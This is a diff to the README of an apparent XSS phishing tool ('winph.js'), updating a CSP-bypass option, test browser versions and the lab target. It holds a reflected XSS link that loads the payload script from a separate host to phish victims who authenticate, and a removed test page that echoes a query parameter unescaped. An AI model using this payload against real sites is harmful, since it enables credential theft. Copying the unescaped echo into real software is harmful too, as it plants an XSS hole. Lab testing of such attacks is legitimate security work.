@@ -14,7 +14,7 @@ The payload (`winph.js`) supports options:
 
   ```
   ...
-  var bypassCSP = false;
+  const bypassCSP = false;
   ...
   ```
 
@@ -22,30 +22,21 @@ The payload (`winph.js`) supports options:
 
   ```
   ...
-  var bypassCSP = true;
+  const bypassCSP = true;
   ...
   ```
 
 ## Test Environment
 
-### Web Browsers (20240224)
+### Web Browsers (20250426)
 
-* [x] Mozilla Firefox Version 123.0 (64-bit)
-* [x] Google Chrome Version 122.0.6261.70 (64-bit)
-* [x] Microsoft Edge Version 122.0.2365.52 (64-bit)
+* [x] Mozilla Firefox 137.0.2 (64-bit)
+* [x] Google Chrome 135.0.7049.115 (64-bit)
+* [x] Microsoft Edge 135.0.3179.98 (64-bit)
 
-### Vulnerable Page (`rxss.php`)
+### Vulnerable Page
 
-```
-<!DOCTYPE html>
-<html>
-  <body>
-    <h2>Test page</h2>
-    <p>Test content</p>
-    <?php echo '<div>' . $_GET['q'] . '</div>'; ?>
-  </body>
-</html>
-```
+http://testphp.vulnweb.com/listproducts.php?cat=XSS_PAYLOAD_HERE
 
 ## Exploitation Steps
 
@@ -66,12 +57,12 @@ The payload (`winph.js`) supports options:
 3. [social engineering attack] victim user clicks link
 
     ```
-    http://192.168.5.15/rxss.php?q=<script src=http://192.168.5.15/winph.js></script>
+    http://testphp.vulnweb.com/listproducts.php?cat=<script src=http://192.168.5.5/winph.js></script>
     ```
 
     * **NOTES**:
-      * `192.168.5.15` - target site
-      * `192.168.5.15` - web server hosting payload
+      * `testphp.vulnweb.com` - target site
+      * `192.168.5.5` - web server hosting the payload
 
 4. [social engineering attack] victim user authenticates
 
